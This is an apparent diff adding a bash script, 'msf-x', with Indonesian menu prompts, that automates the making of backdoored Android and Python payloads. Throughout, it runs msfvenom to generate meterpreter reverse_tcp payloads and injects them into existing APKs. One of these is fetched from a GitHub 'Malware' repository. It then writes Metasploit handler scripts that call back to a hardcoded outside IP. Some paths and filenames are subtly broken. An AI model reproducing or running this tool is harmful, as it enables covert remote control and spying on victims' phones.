@@ -1,0 +1,479 @@
+#!/bin/bash
+#banner
+function banner() {
+printf "\n\n"
+printf "███╗   ███╗███████╗███████╗              ██╗    ██╗ \e[0m\n"
+printf "████╗ ████║██╔════╝██╔════╝              ╚██╗  ██╔╝ \e[0m\n"
+printf "██╔████╔██║███████╗█████╗      █████╗      ╚███ ╔╝  \e[0m\n"
+printf "██║╚██╔╝██║╚════██║██╔══╝      ╚════╝     ██╔  ██╗ \e[0m\n"
+printf "██║ ╚═╝ ██║███████║██║                   ██╔╝   ██╗ \e[0m\n"
+printf "╚═╝     ╚═╝╚══════╝╚═╝                   ╚═╝    ╚═╝ \e[0m\n"
+printf "\n"                                                              
+printf "\e[1;77m                  .:.:\e[0m\e[1;93m Msf generator \e[0m\e[1;77m:.:.\e[0m\n"                              
+printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]            v1.2 coded by Ripunk@E99       \e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
+printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]            github.com/ripunk/msf-x        \e[0m\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
+printf " \e[1;77m[\e[1;93m::\e[0m\e[1;77m]                  YT :Ripunk16             \e[0m\e[1;77m[\e[1;93m::\e[0m\e[1;77m]\e[0m\n"
+printf "\n"                                            
+} 
+clear
+
+#-- colors --#
+R='\e[1;31m' #RED
+G='\e[1;32m' #GREEN
+B='\e[1;34m' #BLUE
+Y='\e[1;33m' #YELLOW
+C='\e[1;36m' #CYAN
+#jarsign
+sign="am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity "
+#openvpn
+vpn="am start --user 0 -n net.openvpn.openvpn/net.openvpn.unified.MainActivity "
+echo -n "Target Anda Beda Jaringan ? y/n "
+read target
+   if [ $target = "y" ]; then
+     echo
+     $vpn > /dev/null 2>&1
+   else
+       echo
+   fi
+   
+clear
+
+mkdir /sdcard/msf-x > /dev/null 2>&1
+#copy
+lok="/sdcard/msf-x" 
+#wlan0
+wifi=$(ifconfig|grep wlan0 -A 1|tail -n1| awk '{print $2}') 
+wify=($wifi)
+
+# banner
+function banner1(){
+    echo ""
+    echo -e " ${R}         *                     *" 
+    echo -e " ${R}       #*_                     _*#"
+    echo -e " ${B}        #######--#######--#######" 
+    echo -e " ${B}        ###------##---##--##---##" 
+    echo -e " ${B}        ######---#######--#######" 
+    echo -e " ${B}        ###-----------##-------##" 
+    echo -e " ${B}        #######--#######--#######" 
+    
+echo "╔===========================================╗"
+echo "|                                     *©o®* |"
+echo "|                  DEBIAN                   |"
+echo "|              KALI NETHUNTER               |"
+echo "|         Created By : Ripunk@E99           |"
+echo "|            Youtube : Ripunk16             |"
+echo "┖===========================================┙"
+} 
+
+banner
+ulang='y'
+
+while [ $ulang = 'y' ];
+do
+
+#variable
+payload="android/meterpreter/reverse_tcp "
+payload1="python/meterpreter/reverse_tcp "
+
+#start
+start="pg_ctl -D $PREFIX/var/lib/postgresql start "
+stop="pg_ctl -D $PREFIX/var/lib/postgresql stop "
+
+#Listener
+function listener(){
+echo "use exploit/multi/handler " >> meterpreter.rc
+echo "set PAYLOAD android/meterpreter/reverse_tcp " >> meterpreter.rc
+echo "set LHOST 193.161.193.99 " >> meterpreter.rc
+echo "set LPORT 8080 " >> meterpreter.rc
+echo "set ExitOnSession false " >> meterpreter.rc
+echo "exploit -j -z " >> meterpreter.rc
+echo "payload.      : android/meterpreter/reverse_tcp"
+echo "LHOST.        :193.161.193.99 "
+echo "LPORT.        :8080 "
+}
+
+#listener1
+function listener1(){
+echo "use exploit/multi/handler " >> meterpreter.rc
+echo "set PAYLOAD android/meterpreter/reverse_tcp " >> meterpreter.rc
+echo "set LHOST $lh " >> meterpreter.rc
+echo "set LPORT $lp " >> meterpreter.rc
+echo "set ExitOnSession false " >> meterpreter.rc
+echo "exploit -j -z " >> meterpreter.rc
+echo "payload.      : android/meterpreter/reverse_tcp"
+echo "LHOST.        :$lh "
+echo "LPORT.        :$lp "
+}
+
+#listenerp
+function listener_p(){
+echo "use exploit/multi/handler " >> meterpreter.rc
+echo "set PAYLOAD python/meterpreter/reverse_tcp " >> meterpreter.rc
+echo "set LHOST 193.161.193.99 " >> meterpreter.rc
+echo "set LPORT 8080 " >> meterpreter.rc
+echo "set ExitOnSession false " >> meterpreter.rc
+echo "exploit -j -z " >> meterpreter.rc
+echo "payload.      : android/meterpreter/reverse_tcp"
+echo "LHOST.        :193.161.193.99 "
+echo "LPORT.        :8080 "
+}
+
+#listenerp1
+function listener_p1(){
+echo "use exploit/multi/handler " >> meterpreter.rc
+echo "set PAYLOAD android/meterpreter/reverse_tcp " >> meterpreter.rc
+echo "set LHOST $lh " >> meterpreter.rc
+echo "set LPORT $lp " >> meterpreter.rc
+echo "set ExitOnSession false " >> meterpreter.rc
+echo "exploit -j -z " >> meterpreter.rc
+echo "payload.      : android/meterpreter/reverse_tcp"
+echo "LHOST.        :$lh "
+echo "LPORT.        :$lp "
+}
+
+#eror
+function eror(){
+if [ -e $o ]; then
+echo -e "\e[1;34m[*] \e[33mYou can bind payload on \e[35m$o\e[32m"
+else
+echo -n "[*]Coba aplikasi lain? y/n "
+read app
+    if [ $app = "y" ]; then
+       bash b
+    else
+       echo
+       exit
+    fi
+
+fi
+}
+
+#spy_phone
+function Spy_Phone(){
+wget https://github.com/PyRAT-svg/Malware/raw/master/spyphone.apk > /dev/null 2>&1
+echo -e "[*] Create payload"
+msfvenom -p $payload LHOST=193.161.193.99 LPORT=28174 -o pay.apk > /dev/null 2>&1
+echo -e "\033[33m[*] Decompile payload"
+apktool d pay.apk -o payload > /dev/null 2>&1
+echo -e "\033[33m[*] Decompile original "
+apktool d spyphone.apk -o original > /dev/null 2>&1
+echo -e "[*] Hook Smali "
+rm -r original/smali/com/metasploit > /dev/null 2>&1
+mkdir original/smali/com/metasploit > /dev/null 2>&1
+sleep 1
+mv -f payload/smali/com/metasploit/stage original/smali/com/ > /dev/null 2>&1
+echo -e "[*] Building apk "
+apktool b original -o E99_spyphone.apk > dev/null 2>&1
+eror
+cp E99_spayphone.apk $lok
+$sign
+}
+
+#spy_phone1
+function Spy_Phone1(){
+wget https://github.com/PyRAT-svg/Malware/raw/master/spyphone.apk > /dev/null 2>&1
+read -p " LHOST  [*] Example ${wify} :" lh;
+read -p " LPORT  [*] Example 4444 :" lp;
+echo -e "[*] Create Payload"
+msfvenom -p $payload LHOST=$lh LPORT=$lp -o pay.apk > /dev/null 2>&1
+echo -e "\033[33m Decompile payload"
+apktool d pay.apk -o payload > /dev/null 2>&1
+echo -e "\033[33m Decompile original "
+apktool d spyphone.apk -o original > /dev/null 2>&1
+echo -e "[*] Hook Smali"
+sleep 1
+rm -r /original/smali/com/metasploit > /dev/null 2>&1
+mkdir /original/smali/com/metasploit > /dev/null 2>&1
+mv -f /payload/smali/com/metasploit/stage /original/smali/com/metasploit/ > /dev/null 2>&1
+echo -e "[*] Building apk"
+apktool b original -o E99_spyphone.apk > /dev/null 2>&1
+eror
+cp E99_spayphone.apk $lok
+$sign
+}
+
+# menu
+echo -e "\033[33m[1]. ${R} payload msf "
+echo -e "\033[33m[2]. ${R} apk ori "
+echo -e "\033[33m[3]. ${R} python "
+echo -e "\033[33m[4]. ${R} Spy_Phone "
+echo -e "\033[33m[5]. ${R} Key WhatsApp "
+echo
+echo -e "\033[33m[e]. ${C} exit "
+echo -n "[root@E99]:" 
+read pilihan
+
+case $pilihan in
+1)
+echo -e "${Y}[a].${B}Beda Jaringan ${R}[Port Forward] " 
+echo -e "${Y}[b].${B}Satu Jaringan ${R}[Wifi Only] " 
+echo -e "${C}" 
+echo -n "[root@E99]:"
+read pi
+esac
+
+#BedaJaringan
+case $pi in
+a) 
+read -p "Nama apk :" apk;
+echo "Create Payload" 
+msfvenom -p $payload LHOST=193.161.193.99 LPORT=28174 -o  $apk
+cp $apk $lok
+echo
+rm meterpreter.rc
+sleep 2
+banner1
+listener
+echo -e "\e[1;32m______________________________ \e[35m"
+echo -n "[*]Jalankan metasploit? y/n " 
+read msf
+       if [ $msf = "y" ]; then
+       sleep 1
+       $start
+       msfconsole -r meterpreter.rc
+       $stop
+       else
+           exit
+       fi
+esac
+case $pi in
+
+#SatuJaringan
+b) 
+echo -e "\e[1;35m_____________________________ \e[35m"
+  echo
+  read -p " LHOST  [*] Example ${wify} :" lh;
+  read -p " LPORT  [*] Example 4444 :" lp;
+  read -p " OUTPUT [*] Example backdoor.apk :" o;
+  echo
+  echo " host : $lh"
+  echo " port : $lp"
+  echo " output: $o"
+echo -e "\e[1;35m_______________________________ \e[35m"
+echo -e "\033[35m [✓] \033[1;33mGenerat payload "
+msfvenom -p $payload LHOST=$lh LPORT=$lp -o $o
+cp $o $lok
+sleep 1
+echo
+rm meterpreter.rc
+sleep 2
+clear
+banner1
+listener1
+echo -e "\e[1;32m______________________________ \e[35m"
+echo -n "[*]Jalankan metasploit? y/n " 
+read msf
+       if [ $msf = "y" ]; then
+       sleep 1
+       $start
+       msfconsole -r meterpreter.rc
+       $stop
+       else
+           exit
+       fi
+esac
+
+case $pilihan in
+2)
+echo -e "${Y}[a]. ${B}Beda Jaringan${R} [PortForward] " 
+echo -e "${Y}[b]. ${B}Satu Jaringan ${R}[Wifi Only] " 
+echo -e "${C}" 
+echo -n "[root@E99]:"
+read pi
+esac
+
+#BedaJaringan
+case $pi in
+a)
+echo -e "${R}Pilih apps yang mau di injeck"
+echo
+ls | grep .apk
+echo
+read -p "[root@E99]:" apk;
+read -p "Output:" o;
+echo -e "${R}[ ✓ ] ${G}Generat payload "
+msfvenom -x $apk -p $payload LHOST=193.161.193.99 LPORT=28174 -o $o
+cp $o $lok
+sleep 1
+eror
+echo
+rm meterpreter.rc > /dev/null 2>&1
+sleep 2
+clear
+banner1
+listener
+echo -n "[ ✓ ]Jalankan metasploit? y/n " 
+read msf
+       if [ $msf = "y" ]; then
+       sleep 1
+       $start
+       msfconsole -r meterpreter.rc
+       $stop
+       else
+           echo 
+           exit
+       fi
+esac
+
+#SatuJaringan
+case $pi in
+b) 
+echo 
+echo -e "${R}Pilih apps yang mau di injeck" 
+ls | grep .apk
+read -p "Nama :" apk;
+read -p "LHOST  [*] Example ${wify} :" lh;
+read -p "LPORT  [*] Example 4444 :" lp;
+read -p "OUTPUT [*] Example backdoor.apk:" o;
+echo
+echo -e "\033[33m[!] HOST : $lh"
+echo -e "\033[33m[!] PORT : $lp"
+echo -e "\033[33m[!] OUTPUT : $o"
+echo 
+echo -e "${R}[✓] ${G}Generat payload "
+msfvenom -x $apk -p $payload LHOST=$lh LPORT=$lp -o $o
+cp $o $lok
+eror
+rm meterpreter.rc > /dev/null 2>&1
+sleep 2
+clear
+banner1
+listener1
+echo -n "[✓]Jalankan metasploit? y/n " 
+read msf
+       if [ $msf = "y" ]; then
+       sleep 1
+       $start
+       msfconsole -r meterpreter.rc
+       $stop
+       else
+           echo
+           exit
+       fi
+esac
+
+case $pilihan in
+3)
+echo -e "${Y}[a]. ${B}Beda Jaringan${R} [PortForward] " 
+echo -e "${Y}[b]. ${B}Satu Jaringan ${R}[Wifi Only] " 
+echo -e "${C}" 
+echo -n "[root@E99]:"
+read pi
+esac
+
+case $pi in
+a) 
+read -p "output:" o;
+echo -e "${R}[✓] ${G}Generate payload "
+msfvenom -p $payload1 LHOST=193.161.193.99 LPORT=28174 -o $o
+cp $o $lok
+rm meterpreter.rc > /dev/null 2>&1
+clear
+banner
+listener_p
+echo -e "${R}" 
+echo -n "[!]Jalankan metasploit? y/n " 
+read msf
+       if [ $msf = "y" ]; then
+       sleep 1
+       $start
+       msfconsole -r meterpreter.rc
+       $stop
+       else
+           echo
+           exit
+       fi
+esac
+#satuJaringan
+case $pi in
+b) 
+read -p "LHOST [*] Example ${wify} :" lh;
+read -p "LPORT [*] Example 4444 :" lp;
+read -p "OUTPUT [*] Example Backdoor.py :" o;
+echo
+echo "${R}[!]HOST : $lh"
+echo "${R}[!]PORT : $lp"
+echo "${R}[!]OUTPUT: $o"
+clear
+echo -e "${R}[✓] ${G}Generate payload "
+msfvenom -p $payload1 LHOST=$lh LPORT=$lp -o $o
+cp $o $lok
+rm meterpreter.rc > /dev/null 2>&1
+clear
+banner1
+listener_p1
+echo -e "${R}" 
+echo -n "[!]Jalankan metasploit? y/n " 
+read msf
+       if [ $msf = "y" ]; then
+       sleep 1
+       $start
+       msfconsole -r meterpreter.rc
+       $stop
+       else
+           echo
+           exit
+       fi
+esac
+
+case $pilihan in
+4)
+echo -e "${Y}[a]. ${B}Beda Jaringan${R} [PortForward] " 
+echo -e "${Y}[b]. ${B}Satu Jaringan ${R}[Wifi Only] " 
+echo -n "[root@E99]:"
+read pi
+esac
+
+#bedajaringan
+case $pi in
+a)
+Spy_Phone
+rm meterpreter.rc > /dev/null 2>&1
+banner1
+listener
+echo -e "${R}" 
+echo -n "[!]Jalankan metasploit? y/n " 
+read msf
+       if [ $msf = "y" ]; then
+       sleep 1
+       $start
+       msfconsole -r meterpreter.rc
+       $stop
+       else
+           echo
+           exit
+       fi
+esac
+
+#satujaringan
+case $pi in
+b)
+Spy_Phone1
+rm meterpreter.rc > /dev/null 2>&1
+banner1
+listener1
+echo -e "${R}" 
+echo -n "[!]Jalankan metasploit? y/n " 
+read msf
+       if [ $msf = "y" ]; then
+       sleep 1
+       $start
+       msfconsole -r meterpreter.rc
+       $stop
+       else
+           echo
+           exit
+       fi
+esac
+
+case $pilihan in
+5)
+#echo -e "${R}Comingsoon...!! "
+sleep 2
+esac
+
+case $pilihan in
+e)
+exit
+esac
+done
